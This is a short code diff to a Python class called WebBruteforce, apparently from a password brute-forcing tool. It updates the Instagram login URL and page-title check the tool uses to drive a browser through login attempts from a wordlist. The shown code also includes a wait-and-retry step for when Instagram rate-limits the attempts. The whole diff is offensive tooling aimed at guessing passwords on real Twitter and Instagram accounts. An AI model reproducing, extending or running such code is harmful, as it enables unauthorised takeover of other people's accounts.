@@ -70,7 +70,7 @@ class WebBruteforce(object):
             driver.get("https://mobile.twitter.com/session/new")
             sleep(delay * 2)
         elif service == "instagram":
-            driver.get("https://instagram.com/accounts/login")
+            driver.get("https://www.instagram.com/accounts/login/?force_classic_login")
 
 
         wordlist = open(wordlist, 'r')
@@ -107,7 +107,7 @@ class WebBruteforce(object):
                 elif service == "twitter":
                     assert (("Twitter") in driver.title)
                 elif service == "instagram":
-                    assert (("Login") in driver.title)
+                    assert (("Log in — Instagram") in driver.title)
                     if TIMEOUT in driver.page_source:
                         print O + "[!] Timeout raised! Waiting... [!]" + W
                         sleep(300)
